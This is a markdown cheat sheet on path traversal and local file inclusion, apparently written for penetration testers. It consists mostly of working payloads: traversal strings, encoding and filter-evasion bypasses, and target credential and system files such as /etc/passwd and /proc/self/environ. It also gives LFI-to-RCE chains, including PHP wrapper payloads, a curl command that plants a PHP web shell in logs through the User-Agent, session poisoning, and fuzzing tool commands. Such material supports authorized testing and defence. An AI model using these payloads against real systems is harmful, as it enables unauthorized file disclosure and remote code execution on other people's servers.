---
tags:
  - critical
  - server-side
---

# Path Traversal / LFI

## TL;DR

Read files outside intended directories using `../` sequences.

**Key bypasses:** URL encoding, Tomcat semicolon (`..;/`), double encoding, null bytes (legacy).

## Detection

### Common Parameters

```
file, path, page, document, folder, root, dir, 
include, template, view, content, download, 
cat, action, load, read, doc
```

### Basic Tests

```
?file=../../../etc/passwd
?path=....//....//....//etc/passwd
?include=..%2f..%2f..%2fetc%2fpasswd
```

### Error Analysis

- "File not found" vs "Access denied" reveals validation
- Stack traces may show file paths
- Different errors for existing vs non-existing files

## Exploitation

### Classic Traversal

```
../../../../../../../etc/passwd
../../../../../../../WEB-INF/web.xml
..%2f..%2f..%2fWEB-INF%2fweb.xml
```

### URL Encoding

```bash
# Single encoding
..%2f..%2f..%2fetc%2fpasswd

# Double encoding  
%252e%252e%252f%252e%252e%252f%252e%252e%252f

# Mixed
..%2f..%2f..%2f
```

### Tomcat Semicolon Bypass

```
/..;/examples/servlets/servlet/SessionExample
/..;/examples/servlets/servlet/CookieExample
```

Tomcat treats semicolon as parameter separator.

### Process File Descriptors (Linux)

```bash
# DoS via stdout/stdin
../../../../../proc/self/fd/1
/proc/self/fd/0

# Race condition with uploads
/proc/self/fd/10
```

### File Existence Disclosure

```
?pak=../../../../../etc/passwd     # "WRONG_PAK_TYPE" = exists
?pak=../../../../../nonexistent    # "NOT_READABLE" = doesn't exist
```

## Bypasses

### Dot Encodings

```
.     = %2e
..    = %2e%2e
../   = %2e%2e%2f
```

### Double Encoding

```
../   = %252e%252e%252f
.     = %252e  
/     = %252f
```

### UTF-8 Overlong

```
../   = %c0%ae%c0%ae%c0%af
```

### Backslash (Windows)

```
..\   = %2e%2e%5c
\     = %5c
```

### Filter Evasion

```
....//           # Doubled dots
..\/             # Mixed separators
..;/             # Tomcat semicolon
..././           # Nested
..//..//         # Mixed valid/invalid
```

### Null Byte (Legacy PHP)

```
../../../etc/passwd%00.jpg
../../../etc/passwd\0.jpg
```

## Target Files

### Linux/Unix

```
/etc/passwd
/etc/hosts  
/proc/version
/proc/self/environ
/var/log/apache2/access.log
```

### Windows

```
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini
C:\boot.ini
```

### Java Applications

```
/WEB-INF/web.xml
/WEB-INF/classes/
/META-INF/MANIFEST.MF
```

### PHP Applications

```
/etc/php/7.x/apache2/php.ini
/var/log/apache2/error.log
/proc/self/environ
```

## LFI → RCE

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=config.php
php://input (POST: <?php system('id'); ?>)
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id
zip://uploads/evil.zip#shell.php
phar://uploads/avatar.jpg/stub
```

### Log Poisoning

```bash
# Inject in User-Agent, then include log
curl -A "<?php system(\$_GET['c']); ?>" http://target/
?page=../../../var/log/apache2/access.log&c=id
?page=../../../var/log/nginx/access.log&c=id
?page=../../../var/log/mail.log&c=id
```

### Session Poisoning

```
?page=../../../tmp/sess_<SESSIONID>
?page=../../../var/lib/php/sessions/sess_<SESSIONID>
```

### /proc Harvesting

```
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/X
/proc/self/maps
```

### Nginx Alias Mismatch

```
/static../etc/passwd
/static..;/etc/passwd
```

## Tools

```bash
# Prevent path normalization
curl --path-as-is "http://target/../../../etc/passwd"

# Fuzzing
ffuf -u "https://target.com/view?file=FUZZ" -w lfi-payloads.txt

# dotdotpwn
dotdotpwn -m http -h target.com -f /etc/passwd

# nuclei
nuclei -u https://target.com -t lfi/
```

## Checklist

1. Basic `../` traversal
2. URL encoded variants (`%2e%2e%2f`)
3. Double encoding (`%252e%252e%252f`)
4. Null byte injection (legacy)
5. Platform-specific (`..;/` for Tomcat)
6. Mixed separators (`..\..\`)
7. Filter evasion (`....//`)
8. Chain with file upload for RCE
9. Proc file descriptors for info disclosure

## Real Examples

- **HackerOne #1007799:** LFI via `..%2f..%2f..%2fWEB-INF%2fweb.xml`
- **HackerOne #1004007:** Tomcat `..;/` bypass
- **HackerOne #936399:** Cisco ASA CVE-2020-3452 with `%2b` encoding
- **HackerOne #383112:** Node.js ponse module LFI
- **HackerOne #2168002:** phpBB race condition via `/proc/self/fd/10`
